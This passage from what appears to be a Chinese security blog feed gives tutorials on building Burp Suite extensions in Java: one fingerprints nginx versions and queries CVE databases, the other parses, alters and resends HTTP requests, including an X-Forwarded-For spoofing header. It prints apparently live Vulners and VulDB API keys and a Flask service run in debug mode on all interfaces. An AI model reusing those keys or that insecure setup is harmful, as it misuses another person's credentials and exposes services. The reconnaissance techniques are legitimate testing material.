      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近需要开发一个插件：首先需要识别初nginx的版本号，其次需要列出该版本号存在的CVE漏洞列表。<a id="more"></a></p><h1 id="1-识别nginx版本号"><a href="#1-识别nginx版本号" class="headerlink" title="1 识别nginx版本号"></a>1 识别nginx版本号</h1><p>首先识别nginx的版本号，我们知道nginx错误页会暴露该版本号，因此我们只需要解析response报文，利用正则表达式匹配出版本号即可。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1624603419556.png" alt="1624603419556"></p><p>(1)获取Response报文</p><pre class="line-numbers language-java"><code class="language-java">String response <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2)定义识别nginx的正则表达式为nginx/\d+(\.\d+){2}+然后进行正则匹配，获得nginx版本号</p><pre class="line-numbers language-java"><code class="language-java">String nginxRegex <span class="token operator">=</span> <span class="token string">"nginx/\\d+(\\.\\d+)&amp;#123;2&amp;#125;+"</span><span class="token punctuation">;</span>Pattern p <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>RegexStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 现在创建 matcher 对象</span>String detectVersion<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>Matcher m <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    detectVersion <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到nginx版本</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将上述代码编译成jar文件，加载到burpsuite上，运行如下：识别nginx成功。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1621909703111.png" alt="1621909703111"></p><h1 id="2-检索该版本对应的CVE漏洞"><a href="#2-检索该版本对应的CVE漏洞" class="headerlink" title="2 检索该版本对应的CVE漏洞"></a>2 检索该版本对应的CVE漏洞</h1><p>检索对应版本存在的CVE漏洞其实有很多的网站：</p><p>例如下面几个网站 但是大多数的网站 该搜索功能结果都没有很准确</p><p><a href="https://snyk.io/vuln/npm:lodash@4.17.15">https://snyk.io/vuln/npm:lodash@4.17.15</a>   结果准确</p><p><a href="https://vulners.com/search?query=affectedSoftware.name:nginx%20AND%20affectedSoftware.version:%221.17.7%22">https://vulners.com/search?query=affectedSoftware.name:nginx%20AND%20affectedSoftware.version:%221.17.7%22</a>  结果特别不准确</p><p><a href="https://vuldb.com/zh/?search.advanced#results">https://vuldb.com/zh/?search.advanced#results</a> 结果相对准确 但是不全 有遗漏</p><p>burpsuite</p><p>识别nginx版本并索引已经知道的CVE漏洞：<br>搜索已经知道的CVE漏洞：<br>1 爬虫：爬取vul,cve网站上的CVE信息：网站设置防爬<br>2 匹配：正则匹配？机器学习去匹配</p><p>调研：bp的插件：Software Vulnerability Scanner利用vulner.comAPI进行扫描探测</p><p>初步思路：</p><h1 id="第一种API接口使用："><a href="#第一种API接口使用：" class="headerlink" title="第一种API接口使用："></a>第一种API接口使用：</h1><p>问题：python有对应的库但是存在burpsuite加载不成功的问题，但是java无，只能通过APi访问，但是 搜索不准确，</p><p><a href="https://vulners.com/">https://vulners.com/</a></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622014351054.png" alt="1622014351054"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622015887598.png" alt="1622015887598"></p><p>获取API获取Vulners API密钥</p><p>请在<a href="https://vulners.com/">Vulners网站上</a>注册。通过单击右上角的名称进入个人菜单。遵循“ API KEYS”标签。生成范围为“ <strong>api</strong>”的API密钥，并将其与库一起使用。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622081435003.png" alt="1622081435003"></p><p><strong>API Key -</strong> 7CX5RVZEMZ6M5RGRI3GPJ6IEJO0ZSV6JLZ7SHO022C1ZJ7XIB32EJIB0NI47ICFK</p><p><strong>Created -</strong> 2021-05-27T05:10:27</p><p><strong>License Type -</strong> free</p><p><strong>Scope</strong></p><p>api</p><p><strong>IP List</strong></p><p>报错：</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622097162280.png" alt="1622097162280"></p><p>但是直接在py运行是OK的</p><p>第三种</p><p><a href="https://github.com/vulnersCom/api">https://github.com/vulnersCom/api</a></p><p>先安装该库</p><pre><code>pip install -U vulners</code></pre><p>get-vulner-cve.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> vulnersapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/getcvelist"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getcvelist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    API_KEY<span class="token operator">=</span><span class="token string">"7CX5RVZEMZ6M5RGRI3GPJ6IEJO0ZSV6JLZ7SHO022C1ZJ7XIB32EJIB0NI47ICFK"</span>    vulners_api <span class="token operator">=</span> vulners<span class="token punctuation">.</span>Vulners<span class="token punctuation">(</span>api_key<span class="token operator">=</span>API_KEY<span class="token punctuation">)</span>    json_data <span class="token operator">=</span> request<span class="token punctuation">.</span>json    software<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">"software"</span><span class="token punctuation">]</span>    version<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">"version"</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># return software+version</span>    sw_results <span class="token operator">=</span> vulners_api<span class="token punctuation">.</span>softwareVulnerabilities<span class="token punctuation">(</span>software<span class="token punctuation">,</span> version<span class="token punctuation">)</span>    sw_vulnerabilities_list <span class="token operator">=</span> <span class="token punctuation">[</span>sw_results<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">for</span> key <span class="token keyword">in</span> sw_results <span class="token keyword">if</span> key <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'NVD'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>res<span class="token operator">=</span>sw_vulnerabilities_list<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>nohup python3 get-vulner-cve.py &amp;</code></pre><p>API用法参考：<a href="https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py">https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py</a></p><h1 id="第二种API使用"><a href="#第二种API使用" class="headerlink" title="第二种API使用"></a>第二种API使用</h1><p><a href="https://vuldb.com/zh/?doc.api">https://vuldb.com/zh/?doc.api</a></p><p>API： 8ddd49c11f021f3e3b6f192c54a9f794 </p><p>但是每天只有50次积分  并且搜索不全面</p><p>pass</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623219451415.png" alt="1623219451415"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623220355231.png" alt="1623220355231"></p><p><a href="https://docs.vulners.com/api/">Vulners官方API使用说明</a></p><p><a href="https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py">Vulners API使用参考</a></p><p><a href="https://c.runoob.com/front-end/854">正则表达式在线测试</a></p><p><a href="https://blog.csdn.net/zp437734552/article/details/51469549">正则表达式判断版本号</a></p><p><a href="https://github.com/portswigger/software-vulnerability-scanner">根据版本号搜索CVE的插件</a></p><p><a href="http://sh1yan.top/2020/03/02/Writing-the-burpseuite-plug-in-beginner/">API解释</a></p><p>app-portal:</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380555468.png" alt="1623380555468"></p><p>dev-portal:</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380707202.png" alt="1623380707202"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380812981.png" alt="1623380812981"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380835346.png" alt="1623380835346"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380855686.png" alt="1623380855686"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380922717.png" alt="1623380922717"></p><p><a href="https://portal-ppe1.envisioniot.com/portal/testt">https://portal-ppe1.envisioniot.com/portal/testt</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/">插件开发</category>
      
      
      <comments>https://m01ly.github.io/2021/05/24/burpsuite-develop-detect-nginx/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>从0开发burpsuite插件（Java）</title>
      <link>https://m01ly.github.io/2021/05/21/burpsuite-develop/</link>
      <guid>https://m01ly.github.io/2021/05/21/burpsuite-develop/</guid>
      <pubDate>Fri, 21 May 2021 08:41:38 GMT</pubDate>
      
      <description>&lt;p&gt;本人从0开始，写一个bp的开发教程，思路为：跟着教程搭建出一个可以用在burpsuite的插件，然后在此基础上构建一个由GUI的插件，后面进一步去熟悉插件相关的API函数。本文教程基于gradle项目，因为方便引言一些插件库。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本人从0开始，写一个bp的开发教程，思路为：跟着教程搭建出一个可以用在burpsuite的插件，然后在此基础上构建一个由GUI的插件，后面进一步去熟悉插件相关的API函数。本文教程基于gradle项目，因为方便引言一些插件库。<a id="more"></a></p><h2 id="1-一个小的bp插件Demo"><a href="#1-一个小的bp插件Demo" class="headerlink" title="1 一个小的bp插件Demo"></a>1 一个小的bp插件Demo</h2><h3 id="1-1新建一个gradle项目"><a href="#1-1新建一个gradle项目" class="headerlink" title="1.1新建一个gradle项目"></a>1.1新建一个gradle项目</h3><p>(1)新建一个gradle项目，项目名为：burp-detect-nginx</p><p><img src="/2021/05/21/burpsuite-develop/1621586533328.png" alt="1621586533328"></p><p>(2)新建完后，在 build.gradle 文件中添加以下依赖，也就是加载 burpsuite 插件API ，如果提示 auto import， 可以点击，从而自动从远程仓库加载 burpsuite API 。具体需要的版本可以去<a href="https://search.maven.org/artifact/net.portswigger.burp.extender/burp-extender-api">Maven中央存储库</a>搜索，这里使用的是1.7.13</p><pre><code>compile(&#39;net.portswigger.burp.extender:burp-extender-api:1.7.13&#39;)</code></pre><p>同时在 plugins 里面添加 shadow 插件，该插件可以方便把项目打包成 jar 包。shadow版本需要根据自己的gadle版本去选择，<a href="https://plugins.gradle.org/m2/com/github/jengelman/gradle/plugins/shadow/">shaow插件版本可以根据这里去选择</a>。这里我的选择的是4.0.3，然后保存 build.gradle文件可以看到加载成功。</p><pre><code>id &#39;com.github.johnrengelman.shadow&#39; version &#39;4.0.3&#39;</code></pre><p><img src="/2021/05/21/burpsuite-develop/1621592658534.png" alt="1621592658534"></p><p>(3)接着在 /src/main/java 目录处创建一个名为 burp 的包名，在 java 目录处右键 -&gt; New -&gt; Package，接着在该包上右键，新建一个名为 BurpExtender 的类。这里需要注意的是这个包名和类名是固定的，burpsuite 加载插件时就是通过 burp.BurpExtender 来查找的，如果不这样起名，会报 ClassNotFoundException 。</p><h3 id="1-2-编写插件"><a href="#1-2-编写插件" class="headerlink" title="1.2 编写插件"></a>1.2 编写插件</h3><p>在BurpExtender 中继承 IBurpExtender 接口，并实现registerExtenderCallbacks方法。（BurpExtender 类需要实现 IBurpExtender 接口，burp 在加载插件时，会调用该接口，并传递 IBurpExtenderCallbacks 接口仅我们使用。）registerExtenderCallbacks方法内添加下面的代码为插件设置名称，并打印一 success 字符串</p><pre><code>callbacks.setExtensionName(&quot;data-collect2&quot;);callbacks.printOutput(&quot;load success&quot;);</code></pre><p><img src="/2021/05/21/burpsuite-develop/1621592834548.png" alt="1621592834548"></p><h3 id="1-3-编译为jar包"><a href="#1-3-编译为jar包" class="headerlink" title="1.3 编译为jar包"></a>1.3 编译为jar包</h3><p>点击右侧的 gradle 菜单，展开菜单，双击 shadowjar ，gradle 会自动编译项目成 jar 包，jar 包位于 build 目录中的 libs 目录中。 选中生成的jar包，右击show in exploer就可以得到我们的jar包</p><p><img src="/2021/05/21/burpsuite-develop/1621593085131.png" alt="1621593085131"></p><h3 id="1-4-burpsuite-加载该jia包"><a href="#1-4-burpsuite-加载该jia包" class="headerlink" title="1.4 burpsuite 加载该jia包"></a>1.4 burpsuite 加载该jia包</h3><p>在 burp 的扩展选项卡Extender-&gt;Extensions–&gt;Add，选择Java类型，加载jar包点next就可以看到加载成功。</p><p><img src="/2021/05/21/burpsuite-develop/1621593214656.png" alt="1621593214656"></p><p>可以看到加载插件后成功打印了 success 字符串。</p><p><img src="/2021/05/21/burpsuite-develop/1621593371239.png" alt="1621593371239"></p><h2 id="2-添加标签页"><a href="#2-添加标签页" class="headerlink" title="2 添加标签页"></a>2 添加标签页</h2><h3 id="2-1-创建一个标签页："><a href="#2-1-创建一个标签页：" class="headerlink" title="2.1 创建一个标签页："></a>2.1 创建一个标签页：</h3><p>(1)先在IDEA中创建一个 Form:file–&gt;new–GUI Form，用于设计UI ：在burp文件夹内如下图方式创建一个 DataCollectGUI.form</p><p><img src="/2021/05/21/burpsuite-develop/1621593462769.png" alt="1621593462769"></p><p>(2)创建的界面如下，左边的窗口中创建了两个文件，一个是 DataCollectGUI.java 文件，该文件与 form 文件绑定，一个是 DataCollectGUI.form 文件，可以在此文件上拖动控件来设计 UI 界面，当界面更新时，会自动生成代码插入 DataCollectGUI.java 文件中。 直接通过拖拉控件到面板即可完成UI设计。</p><p><img src="/2021/05/21/burpsuite-develop/1621593667153.png" alt="1621593667153"></p><h3 id="2-2-打包GUI类"><a href="#2-2-打包GUI类" class="headerlink" title="2.2 打包GUI类"></a>2.2 打包GUI类</h3><p>为了让 IDEA 打包 GUI 界面的类，需要在 build.gradle 添加以下依赖</p><pre><code>compile(&#39;com.intellij:forms_rt:7.0.3&#39;)</code></pre><p>（1）在设置中设置根据 Form 界面自动生成 Java 源码：file-settings-&gt;editor-&gt;GUI Designer–&gt;java source code-apply-ok</p><p><img src="/2021/05/21/burpsuite-develop/1621594071138.png" alt="1621594071138"></p><p>(2)然后在 Gradle 的编译选项中设置编译器是 IDEA 自带的编译器，这样才能自动更新 form 文件中的控件到代码中：file-settings-&gt;Build,Execution,Deployment-&gt;Build Tools-&gt;Gradle:做如图的配置。</p><p><img src="/2021/05/21/burpsuite-develop/1621594242374.png" alt="1621594242374"></p><p>(3)构建项目</p><p>设置好后，点击构建图标，就会自动生成和 form 文件相关的代码，可以看到在 $$$setupUI$$$() 方法中自动生成了我们拖到界面中的3个控件。</p><p><img src="/2021/05/21/burpsuite-develop/1621836741981.png" alt="1621836741981"></p><p>接着需要回到 BurpExtender 类中，要为插件添加一个标签页，需要实现 ITab 接口：实现 ITab 接口后，会有两个方法需要实现，其中 getTabCaption() 方法返回标签页的名称， getUiComponent() 方法返回我们创建的 UI 面板。callbacks.addSuiteTab(this) 来注册接口。</p><p><img src="/2021/05/21/burpsuite-develop/1621837625674.png" alt="1621837625674"></p><h3 id="2-3-设置按钮监听事件"><a href="#2-3-设置按钮监听事件" class="headerlink" title="2.3 设置按钮监听事件"></a>2.3 设置按钮监听事件</h3><p>接下来我们需要获取标签页中的配置内容，可以通过添加事件监听器来实现。回到 IDEA 的 form 文件中，在按钮上右键，点击 Create Listener，选择 ActionListener.在这里简单地把输入框中的内容打印在插件日志中，要把内容打印到插件日志中，我们需要获取 IBurpExtenderCallbacks 对象，可以修改构造函数，在初始化时传入：</p><p><img src="/2021/05/21/burpsuite-develop/1621837911606.png" alt="1621837911606"></p><p> 还需要修改 BurpExtender 中的代码，传入 callbacks 对象</p><p><img src="/2021/05/21/burpsuite-develop/1621837935350.png" alt="1621837935350"></p><p>接着在监听器中实现获取标题内容并打印到日志的代码，代码中29行通过 getText()方法获取输入框架的内容，然后在30行处通过 callbacks.printOutput()方法打印内容到日志中。</p><h3 id="2-4-打包jar"><a href="#2-4-打包jar" class="headerlink" title="2.4 打包jar"></a>2.4 打包jar</h3><p>双击 gradle 中的 shadowjar 按钮重新打包 jar 包，然后在 burp 重新加载插件，在插件输入框中输入 12346849， 点击按钮，就会在插件日志中打印输入框中的内容了。</p><p><img src="/2021/05/21/burpsuite-develop/1621838299568.png" alt="1621838299568"></p><p><img src="/2021/05/21/burpsuite-develop/1621838343829.png" alt="1621838343829"> </p><h2 id="3-burpsuite的HTTP处理"><a href="#3-burpsuite的HTTP处理" class="headerlink" title="3 burpsuite的HTTP处理"></a>3 burpsuite的HTTP处理</h2><p>开发burpsuite插件关键在于处理http请求和响应</p><h3 id="3-1-查看包的报文信息"><a href="#3-1-查看包的报文信息" class="headerlink" title="3.1 查看包的报文信息"></a>3.1 查看包的报文信息</h3><p>很多插件都是分析HTTP的请求包和响应包，去分析里面的内容实现某种功能。</p><p>HTTP相关处理主要是IHttpListener接口，他有个方法processHttpMessage用来处理HTTP消息，该方法有3个参数。其中toolflag表示burpsuite中流量的形式，比如通过代理，通过扫描等。具体对应值可以查看<a href="https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks">IBurpExtenderCallbacks接口</a>，例如IBurpExtenderCallbacks.TOOL_PROXY表示代理流量；messageInfo表示HTTP交互报文，我们就通过初该值的处理得到HTTP的request和response报文，具体处理如下：</p><p>（1）Request分析</p><p>首先可以通过messageInfo.getRequest()获得整个请求报文，然后利用IRequestInfo类对报文进行分解，得到header, body,url等信息</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processHttpMessage</span><span class="token punctuation">(</span><span class="token keyword">int</span> toolFlag<span class="token punctuation">,</span> <span class="token keyword">boolean</span> messageIsRequest<span class="token punctuation">,</span> IHttpRequestResponse messageInfo<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对Request消息进行解体</span>String request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获得请求的body</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头，返回header参数列表</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头的HTTP方法    </span>String method<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头的参数列表       </span>List<span class="token operator">&lt;</span>IParameter<span class="token operator">></span> Params<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头的URL </span>URL url<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）response分析</p><p>首先直接调用messageInfo.getResponse()获取整个response完整报文，如果想要对response分结构的获取，例如获取response报文的header,body等，需要借助IRequestInfo类对报文进行分解</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processHttpMessage</span><span class="token punctuation">(</span><span class="token keyword">int</span> toolFlag<span class="token punctuation">,</span> <span class="token keyword">boolean</span> messageIsRequest<span class="token punctuation">,</span> IHttpRequestResponse messageInfo<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> response <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获得response完整报文</span>    BurpExtender<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Response："</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//对Response消息进行解体</span>    IResponseInfo analyzeResponse <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获得执行的状态码</span>    <span class="token keyword">int</span> statusCode<span class="token operator">=</span>analyzeResponse<span class="token punctuation">.</span><span class="token function">getStatusCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获得header参数</span>    List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeResponse<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-修改包重发"><a href="#3-2-修改包重发" class="headerlink" title="3.2 修改包重发"></a>3.2 修改包重发</h3><p>有些插件的功能需要对交互包进行修改，重发，下面提供几个修改点的例子。</p><h4 id="3-2-1-headers的CRUD，并发送新请求"><a href="#3-2-1-headers的CRUD，并发送新请求" class="headerlink" title="3.2.1 headers的CRUD，并发送新请求"></a>3.2.1 headers的CRUD，并发送新请求</h4><p>（1）获得headers</p><pre class="line-numbers language-javascript"><code class="language-javascript">IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对消息进行解体</span><span class="token comment" spellcheck="true">//获取i请求头，返回header参数列表</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）对header的CRUD</p><pre class="line-numbers language-java"><code class="language-java">String xforward<span class="token operator">=</span><span class="token string">"X-Forwarded-For:127.0.0.1"</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>xforward<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）重新发送改变后的header的请求</p><p>注意重新构建新的Request，这里采用的是buildHttpRequest方法。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重组请求信息</span>    <span class="token comment" spellcheck="true">//获得请求的body</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newRequest<span class="token operator">=</span>helpers<span class="token punctuation">.</span><span class="token function">buildHttpMessage</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*****************获取 http service**********************/</span>    IHttpService service <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getHttpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//重新发送request</span>    callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> newRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2修改URL，然后发送新的请求"><a href="#2-2修改URL，然后发送新的请求" class="headerlink" title="2.2修改URL，然后发送新的请求"></a>2.2修改URL，然后发送新的请求</h4><p>（1）获得原有URL</p><pre class="line-numbers language-java"><code class="language-java">IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对消息进行解体</span>URL url <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(2)构建新的URL： URL的CRUD</p><p>注意，URL的new最好再try catch中去做，不然会报错</p><pre class="line-numbers language-java"><code class="language-java">String newUrlString <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"djkslahf@w*5%oi"</span><span class="token punctuation">;</span>URL newUrl<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/*****************构建新的URL**********************/</span>    newUrl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>newUrlString<span class="token punctuation">)</span><span class="token punctuation">;</span>    BurpExtender<span class="token 